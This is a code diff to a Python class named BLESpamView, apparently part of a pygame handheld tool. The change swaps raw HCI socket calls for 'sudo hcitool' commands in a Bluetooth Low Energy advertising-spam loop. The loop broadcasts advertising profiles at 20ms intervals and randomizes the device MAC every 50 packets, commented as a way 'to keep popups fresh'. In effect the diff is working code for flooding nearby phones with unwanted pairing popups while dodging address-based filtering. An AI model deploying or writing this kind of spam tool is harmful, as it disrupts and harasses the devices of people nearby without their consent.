@@ -81,57 +81,60 @@ class BLESpamView:
 
     def _spam_loop(self):
         try:
-            # Open raw HCI socket
-            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-            sock.bind((self.iface_idx,)) 
-
-            # 1. Disable advertising first
-            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
+            iface = self.interfaces[self.iface_idx]
+            # 1. Bring interface up and stop advertising
+            subprocess.run(["sudo", "hciconfig", iface, "up"], capture_output=True)
+            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
             time.sleep(0.1)
 
-            # 2. Set Advertising Parameters
-            # Interval: 0x0020 (20ms), Type: 0x03 (ADV_NONCONN_IND)
-            params = struct.pack("<HHBBB6sBB", 0x0020, 0x0020, 0x03, 0x00, 0x00, b"\x00"*6, 0x07, 0x00)
-            self._hci_send_cmd(sock, 0x08, 0x0006, params)
+            # 2. Set Advertising Parameters (20ms interval, non-connectable)
+            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0006", "20", "00", "20", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00"], capture_output=True)
 
             while not self._stop_event.is_set():
-                # Randomize MAC every 100 packets
-                if self.packets_sent % 100 == 0:
-                    self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00") # Stop
-                    mac = bytes([random.randint(0, 255) for _ in range(6)])
-                    mac = bytes([mac[0] | 0xC0]) + mac[1:] # Static Random
-                    self._hci_send_cmd(sock, 0x08, 0x0005, mac)
-                    self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01") # Start
-                    time.sleep(0.1)
+                # Randomize MAC every 50 packets to keep popups fresh
+                if self.packets_sent % 50 == 0:
+                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
+                    mac = [random.randint(0, 255) for _ in range(6)]
+                    mac[0] |= 0xC0 # Static Random requirement
+                    mac_str = " ".join(f"{b:02x}" for b in mac)
+                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0005"] + mac_str.split(), capture_output=True)
+                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
 
                 # Select data
-                profile_name, profile_data = PROFILES[self.cursor]
+                _, profile_data = PROFILES[self.cursor]
                 if profile_data == b"ALL":
                     actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                     profile_data = random.choice(actual_profiles)[1]
 
                 # 3. Set Advertising Data
-                cmd_data = bytes([len(profile_data)]) + profile_data.ljust(31, b"\x00")
-                self._hci_send_cmd(sock, 0x08, 0x0008, cmd_data)
+                # Convert bytes to hex string for hcitool
+                hex_data = " ".join(f"{b:02x}" for b in profile_data)
+                # Pad to 31 bytes
+                pad_count = 31 - len(profile_data)
+                if pad_count > 0:
+                    hex_data += " " + " ".join(["00"] * pad_count)
                 
-                # Ensure it's active
-                self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01")
+                # Length byte (e.g., 1e for 30 bytes of data)
+                len_hex = f"{len(profile_data):02x}"
+                
+                cmd = ["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0008", len_hex] + hex_data.split()
+                subprocess.run(cmd, capture_output=True)
+                
+                # Re-enable advertising to ensure the update sticks
+                subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
                 
                 self.packets_sent += 1
-                time.sleep(0.05)
+                time.sleep(0.1)
 
             # Cleanup
-            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
-            sock.close()
+            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
 
         except Exception as e:
-            self.error_msg = f"HCI Error: {e}"
+            self.error_msg = f"Shell Error: {e}"
             self.running = False
 
-    def _hci_send_cmd(self, sock: socket.socket, ogf: int, ocf: int, data: bytes):
-        opcode = (ogf << 10) | ocf
-        packet = struct.pack("<BHB", 0x01, opcode, len(data)) + data
-        sock.send(packet)
+    def _hci_send_cmd(self, sock, ogf, ocf, data):
+        pass # No longer used but kept to avoid errors elsewhere if any
 
     def render(self, surf: pygame.Surface) -> None:
         surf.fill(theme.BG)
